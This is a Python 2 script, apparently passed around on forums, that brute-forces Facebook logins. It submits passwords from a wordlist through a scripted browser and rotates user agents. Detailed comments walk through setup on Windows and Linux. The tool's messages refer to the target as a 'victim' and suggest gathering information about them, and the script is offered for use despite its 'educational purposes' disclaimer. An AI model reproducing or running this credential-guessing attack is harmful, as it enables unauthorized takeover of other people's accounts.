#!usr/bin/python
#Ben Woodfield
#Not my work, but I edited a little and have list generators that are meant to run alongside this

#Facebook Cracker Version 2.1 can crack into Facebook Database 100% without Interruption By Facebook Firewall !
#This program is for educational purposes only.
#Don't attack people facebook accounts it's illegal ! 
#If you want to crack into someone's account, you must have the permission of the user. 

# HOW TO USE IN WINDOWS SYSTEMS 
# You need to have Python 2.7, and mechanize module installed. Both available freely
# Copy ALL files from Python27 - found in your (C:) folder
# Paste them ALL into C:/Windows/System32 (confirm message will appear)
# Save THIS Python document to your desktop (for purposes of this guide)
# Save a text file to your dektop (this is your dictionary list - to test the software on your own account - recommended at first - put your fb password into this text file among other words)
# (your text file will test it all works. Needs to have just a simple list of words - no commas, just word <enter> word <enter word etc...)
# Open a CMD (MS DOS, or Command Prompt) AS ADMIN -
# (Right Click the Start menu icon and select Command Prompt (Admin))
# Navigate CMD to your Desktop folder (dir = show folder contents, "cd folder" = change folder)
# when you are in the Desktop folder, first test Mechanize is configured:
# type: python  (should run Python and show you >>> arrows)
# type: import mechanize  (no errors is good - mechanize is working)
# Exit Python: CTRL + D
# type: python fb3.py to run this cracker program (if you changed the document name whan saving it - modify fb3.py to your name for this file)
# You should be given a welcome screen saying enter email, or number, or username - if testing on your own account, enter your username or email, or number linked to the account
# Then you will be asked for the text file
# simply type: text_file.txt (or whatever yours is called
# Hit enter - you will see it goes through the list trying the words you have saved
# If you don't have a match the program will just end
# If you do have a match it will print a message and the correct password will remain on screen

# TO USE IN LINUX
# Download python-mechanize (sudo apt-get install python-mechanize)
# Or download as a tarball (tar.gz) and extract. in terminal enter mechanize directory
# type: python setup.py install
# Test it's configured: python <enter> import mechanize <enter>
# NOTE In Linux you HAVE to be in the mechanize directory to use it - or else Python wont be able to import it
# This means if you're not too good with terminal use, just put all your wordlist text files..AND..this Python document inside the mechanize main directory
# Run the program...python fb3.py


# Please also see my list generator program - used to generate as many possible combinations
# you just enter your set of paramaters (a-z,A-Z,0-9) and how many letters long you want to try
# and it will generate ALL possible character combos...including using letters more than once

import sys
import random
import mechanize
import cookielib
import pdb

GHT = '''
        +=======================================+
        |..........Facebook Cracker v 2.1.......|
        +---------------------------------------+
        | Used for penetration Testing,         |
        | Accessing lost password accounts      |
        | Security purposes                     |
        | Criminal investigations               |
        | Password security Analysis            |
        |                                       |
        |  This program is freely available     |
        |  Use listed above                     |
        |                                       |
        |                                       |
        +=======================================+
        |..........Facebook Cracker v 2.1.......|
        +---------------------------------------+
'''
print "Note: - This tool can crack facebook account even if you don't have the email of your victim"
print "# Hit CTRL+C to quit the program"
print "# Use www.graph.facebook.com for more infos about your victim ^_^"


email = str(raw_input("# Enter |Email| |Phone number| |Profile ID number| |Username| : "))
passwordlist = str(raw_input("Enter the name of the password list file : "))

useragents = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]



login = 'https://www.facebook.com/login.php?login_attempt=1'
def attack(password):

  try:
     sys.stdout.write("\r[*] trying %s.. " % password)
     sys.stdout.flush()
     br.addheaders = [('User-agent', random.choice(useragents))]
     site = br.open(login)
     br.select_form(nr=0)

      
     ##Facebook
     br.form['email'] =email
     br.form['pass'] = password
     br.submit()
     log = br.geturl()
     if (log != login) and (not 'login_attempt' in log):
        pdb.set_trace()
        print "\n\n\n [*] Password found .. !!"
        print "\n [*] Password : %s\n" % (password)
        sys.exit(1)
  except KeyboardInterrupt:
        print "\n[*] Exiting program .. "
        sys.exit(1)

def search():
    global password
    for password in passwords:
        attack(password.replace("\n",""))



def check():

    global br
    global passwords
    try:
       br = mechanize.Browser()
       cj = cookielib.LWPCookieJar()
       br.set_handle_robots(False)
       br.set_handle_equiv(True)
       br.set_handle_referer(True)
       br.set_handle_redirect(True)
       br.set_cookiejar(cj)
       br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
    except KeyboardInterrupt:
       print "\n[*] Exiting program ..\n"
       sys.exit(1)
    try:
       list = open(passwordlist, "r")
       passwords = list.readlines()
       k = 0
       while k < len(passwords):
          passwords[k] = passwords[k].strip()
          k += 1
    except IOError:
        print "\n [*] Error: check your password list path \n"
        sys.exit(1)
    except KeyboardInterrupt:
        print "\n [*] Exiting program ..\n"
        sys.exit(1)
    try:
        print GHT
        print " [*] Account to crack : %s" % (email)
        print " [*] Loaded :" , len(passwords), "passwords"
        print " [*] Cracking, please wait ..."
    except KeyboardInterrupt:
        print "\n [*] Exiting program ..\n"
        sys.exit(1)
    try:
        search()
        attack(password)
    except KeyboardInterrupt:
        print "\n [*] Exiting program ..\n"
        sys.exit(1)

if __name__ == '__main__':
    check()
